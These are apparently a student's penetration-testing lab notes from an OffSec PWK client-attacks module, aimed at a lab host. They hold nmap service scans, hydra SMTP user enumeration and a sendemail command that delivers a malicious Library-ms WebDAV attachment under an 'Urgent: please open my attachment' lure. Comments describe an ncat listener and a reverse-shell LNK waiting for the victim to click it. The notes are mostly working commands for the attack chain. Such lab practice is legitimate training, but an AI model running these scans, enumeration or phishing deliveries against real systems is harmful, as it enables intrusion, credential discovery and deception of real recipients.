# SMTP 
```bash
nmap -vv --reason -Pn -T4 -sV -p 143 --script="banner,(imap* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN "/home/kali/hacking/pwk/12-client-attacks/results/192.168.205.199/scans/tcp143/tcp_143_imap_nmap.txt" -oX "/home/kali/hacking/pwk/12-client-attacks/results/192.168.205.199/scans/tcp143/xml/tcp_143_imap_nmap.xml" 192.168.205.199

nmap -vv --reason -Pn -T4 -sV -p 445 --script="banner,(nbstat or smb* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN "/home/kali/hacking/pwk/12-client-attacks/results/192.168.205.199/scans/tcp445/tcp_445_smb_nmap.txt" -oX "/home/kali/hacking/pwk/12-client-attacks/results/192.168.205.199/scans/tcp445/xml/tcp_445_smb_nmap.xml" 192.168.205.199

nmap -vv --reason -Pn -T4 -sV -p 587 --script="banner,(smtp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN "/home/kali/hacking/pwk/12-client-attacks/results/192.168.205.199/scans/tcp587/tcp_587_smtp_nmap.txt" -oX "/home/kali/hacking/pwk/12-client-attacks/results/192.168.205.199/scans/tcp587/xml/tcp_587_smtp_nmap.xml" 192.168.205.199

hydra smtp-enum://192.168.205.199:587/vrfy -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" 2>&1

hydra smtp-enum://192.168.205.199:25/expn -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" 2>&1

hydra smtp-enum://192.168.205.199:587/expn -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" 2>&1



nmap -vv --reason -Pn -T4 -sV -p 587 --script="banner,(smtp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" 192.168.205.199


```

## Sending an EMAIL
```bash
# 12.3.1 Q3 
# ON KALI, python port 8000 server started, NCAT 4444 started, python wsgidav started, automatic_configration.lnk RevSHell is in same directory as wsgidav server
# we are sending the WebDAV library to our victim, who once they open and mount.,.. will hopefully click on our LNK, giving us RevShell
sendemail -f test@supermagicorg.com -t Dave.Wizard@supermagicorg.com -s 192.168.205.199:587 -xu test@supermagicorg.com -xp test -u "Urgent: please open my attachment" -m "Urgent: please open my attachment." -a ./config.Library-ms  -o tls=yes

Oct 23 00:23:10 kali sendemail[1090229]: Email was sent successfully!
```